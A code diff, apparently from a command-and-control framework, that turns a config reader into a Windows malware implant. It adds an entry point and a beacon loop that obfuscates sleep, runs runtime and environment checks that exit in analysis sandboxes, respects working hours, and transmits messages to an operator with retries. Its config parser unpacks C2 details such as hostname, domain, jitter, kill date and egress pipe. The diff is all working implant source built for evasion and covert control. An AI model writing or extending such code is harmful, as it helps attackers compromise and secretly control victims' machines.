@@ -1,11 +1,60 @@
-#include <core/include/config.hpp>
-namespace Config{
+#include <core/implant/implant.hpp>
 
-    TXT_SECTION(core, F) BYTE ConfigBytes[512] = {};
-    VOID ReadConfig() {
+VOID Entrypoint(HMODULE Base) {
+    Memory::ContextInit();
+    Implant::MainRoutine();
+}
 
+namespace Implant {
+
+    TXT_SECTION(F) BYTE ConfigBytes[512] = {};
+    VOID MainRoutine() {
         HEXANE
-        PARSER Parser = { };
+
+        Memory::ResolveApi();
+        if (ntstatus != ERROR_SUCCESS) {
+            return_defer(ntstatus);
+        }
+
+        Implant::ReadConfig();
+
+        do {
+            Opsec::SleepObf();
+            Opsec::SeRuntimeCheck();
+
+            if (!Opsec::CheckTime()) {
+                continue;
+            }
+
+            if (!Ctx->Session.Checkin) {
+                Opsec::SeCheckEnvironment();
+                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
+                    return_defer(ntstatus);
+                }
+            }
+
+            Message::MessageTransmit();
+            if (ntstatus != ERROR_SUCCESS) {
+                Ctx->Session.Retry++;
+
+                if (Ctx->Session.Retry == 3) {
+                    break;
+                }
+            }
+            else {
+                Ctx->Session.Retry = 0;
+            }
+        }
+        while (TRUE);
+
+    defer:
+        FreeApi(Ctx);
+    }
+
+
+    VOID ReadConfig() {
+        HEXANE
+        PARSER Parser = {};
 
         Parser::CreateParser(&Parser, ConfigBytes, sizeof(ConfigBytes));
         x_memset(ConfigBytes, 0, sizeof(ConfigBytes));
@@ -20,11 +69,12 @@ namespace Config{
             if (
                 !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                 !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.advapi  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.iphl    = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
+                !(Ctx->Modules.advapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.iphl = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
                 return_defer(ERROR_MOD_NOT_FOUND);
             }
-        } else {
+        }
+        else {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
@@ -58,18 +108,17 @@ namespace Config{
             !(FPTR(Ctx->win32.SetSecurityDescriptorDacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
             !(FPTR(Ctx->win32.SetSecurityDescriptorSacl, Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
             !(FPTR(Ctx->win32.FreeSid, Ctx->Modules.advapi, FREESID))) {
-
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
         Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
         Parser::ParserStrcpy(&Parser, &Ctx->Config.Domain, nullptr);
 
-        Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
-        Ctx->Config.Sleeptime       = Parser::UnpackDword(&Parser);
-        Ctx->Config.Jitter          = Parser::UnpackDword(&Parser);
-        Ctx->Config.WorkingHours    = Parser::UnpackDword(&Parser);
-        Ctx->Config.Killdate        = Parser::UnpackDword64(&Parser);
+        Ctx->Session.PeerId = Parser::UnpackDword(&Parser);
+        Ctx->Config.Sleeptime = Parser::UnpackDword(&Parser);
+        Ctx->Config.Jitter = Parser::UnpackDword(&Parser);
+        Ctx->Config.WorkingHours = Parser::UnpackDword(&Parser);
+        Ctx->Config.Killdate = Parser::UnpackDword64(&Parser);
 
         Ctx->Transport.OutboundQueue = nullptr;
 
@@ -109,7 +158,8 @@ namespace Config{
 #ifdef TRANSPORT_PIPE
         Parser::ParserWcscpy(&Parser, &Ctx->ConfigBytes.EgressPipename, nullptr);
 #endif
-        defer:
+    defer:
         Parser::DestroyParser(&Parser);
     }
 }
+
